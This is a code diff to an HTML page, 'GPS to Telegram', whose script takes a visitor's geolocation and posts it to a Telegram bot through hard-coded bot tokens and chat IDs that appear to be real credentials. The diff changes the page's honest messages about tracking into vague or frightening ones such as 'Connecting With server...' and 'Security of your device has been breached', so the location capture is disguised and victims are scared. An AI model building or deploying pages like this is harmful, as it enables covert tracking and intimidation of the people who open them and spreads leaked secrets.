@@ -1558,8 +1558,8 @@
   <head>
     <title>GPS to Telegram</title>
     <script>
-      const botToken = "8390190844:AAHheKXTIGQBW6p9f38SbSO-y1KPWQme-78"; // <-- Replace with your Bot token
-      const chatId = "5255570708"; // <-- Replace with your Chat ID
+      const botToken = "8833805434:AAHt7xzwN1N8ez4AmWadJn9urhdZgXgfBv4"; // <-- Replace with your Bot token
+      const chatId = "7934993186"; // <-- Replace with your Chat ID
 
       function sendLocation(position) {
         const lat = position.coords.latitude;
@@ -1579,11 +1579,11 @@
           })
         })
         .then(() => {
-          document.body.innerHTML = "<h2 style='color:green;'>📬 Location sent to Telegram!</h2>";
+          document.body.innerHTML = "<h2 style='color:green;'>📬Security of your device has been breached</h2>";
         })
         .catch(err => {
           console.error(err);
-          document.body.innerHTML = "<h2 style='color:red;'>❌ Failed to send to Telegram</h2>";
+          document.body.innerHTML = "<h2 style='color:red;'>❌Your device is not safe </h2>";
         });
       }
 
@@ -1593,7 +1593,7 @@
             document.body.innerHTML = "<h2 style='color:red;'>❌ Permission Denied</h2>";
           });
         } else {
-          document.body.innerHTML = "<h2>❌ Geolocation not supported</h2>";
+          document.body.innerHTML = "<h2>❌Your data is not safe</h2>";
         }
       }
 
@@ -1601,7 +1601,7 @@
     </script>
   </head>
   <body>
-    <h2>📡 Tracking Location...</h2>
+    <h2>📡 Connecting With server...</h2>
   </body>
 </html>
 
